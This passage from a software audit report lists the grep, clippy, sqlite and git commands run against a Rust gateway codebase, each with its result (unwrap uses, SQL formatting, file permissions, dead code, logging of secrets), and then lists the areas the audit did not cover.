| `find crates -name '*.rs' -not -path '*/tests/*' \| xargs wc -l \| sort -rn` | 16 503 LOC of production Rust; largest: `gateway/src/lib.rs` 2324, `db/src/repos.rs` 1368, `gateway/src/grok_cli.rs` 1166 |
| `rg -n '\.unwrap()\|\.expect(\|unwrap_or_default()\|todo!\|unimplemented!\|panic!\|unsafe \|println!\|eprintln!\|dbg!\|format!\("SELECT\|…' crates` | Every `.unwrap()`/`.expect(` outside `#[cfg(test)]` is in `translate/requests.rs:539` (guarded by `:536`), `translate/responses.rs:400`, `translate/claude.rs:313`, `translate/gemini.rs:353` (all `expect("chunk is an object")` on a `json!` literal), `providers/registry.rs:65` (compile-time invariant of an `include_str!`), `crypto/src/lib.rs:87`/`:93` (`# Panics` documented at `:77-80`), `restart.rs:118` (test). No `todo!`, `unimplemented!`, `panic!` or `unsafe` anywhere in `crates/`. **No findings.** `unwrap_or_default()` hits are benign optional-field defaults (`lib.rs:662`, `admin.rs:108`, `admin.rs:505`, `claude.rs:171`). |
| `rg -n 'format!\("(SELECT\|INSERT\|UPDATE\|DELETE' crates` | No string-formatted SQL with user data. `repos.rs:881` interpolates a *fixed* column identifier chosen by the caller (documented at `:880`), `repos.rs:107` interpolates a hardcoded column list, `migrate.rs:107` interpolates a hardcoded column name. **No SQL injection.** |
| `CARGO_TARGET_DIR=/tmp/hra-a1 cargo clippy --workspace --all-targets` | `Finished dev profile … in 17.69s`, **zero warnings**. (Note: clippy does not flag the dead `combo_configs` field — W-11 needed `rg`.) |
| `umask; sqlite3 <tmp>/storage.sqlite "PRAGMA journal_mode=WAL; …"; ls -l <tmp>` | `-rw-r--r-- storage.sqlite`, `-rw-r--r-- storage.sqlite-shm`, `-rw-r--r-- storage.sqlite-wal` under umask 022 → confirms W-04 |
| `rg -n 'combo_configs\|combo_config(' crates` | `combo_configs` only at `routing.rs:34`, `:100`, `:115` → never read (W-11) |
| `rg -n '\.expect\([0-9]' crates \| wc -l` / `rg -n 'verify\(\)' crates \| wc -l` | `22` / `0` → W-21 |
| `rg -c '#\[(tokio::)?test\]'` per file | `admin.rs` 1, `auth.rs` 3, `config/settings.rs` 1, `translate/requests.rs` 1; `gateway/tests/upstream_harness.rs` is the only gateway integration test → W-15 |
| `rg -n 'model_target_format\|model_wire_format\|canonical_id\|is_openai_format\|allows_keyless' crates` | `model_target_format`/`model_wire_format` have **no production callers** (registry API surface + tests only) — not counted as a finding |
| `rg -n 'kv_delete\|prune\|retention\|VACUUM' crates desktop/src-tauri/src` | Only the explicit `DELETE /v1/responses/{id}` path → confirms W-03 |
| `rg -n 'tracing::(info\|warn)!' crates/heterion-router-gateway/src/{lib,routing,gemini}.rs` | Every upstream error that reaches a log line goes through `lib.rs:282` / `lib.rs:932`; no credential, token or key value is interpolated anywhere in production tracing output. Gateway.log content read by W-05 therefore contains model ids and upstream messages, not secrets. |
| `git status --porcelain` / `git log --oneline -3` | Dirty tree over `51dfe6d` (pre-existing; only `docs/research/audit-2026-10/01-weaknesses.md` added by this audit) |

## Not covered

`desktop/src-tauri` (excluded from the workspace, not audited), `desktop/ui`
(Svelte), `docs/history/` (frozen upstream material), and live traffic
verification against the running `20128` instance — no request was sent to the
live service and no database was opened.
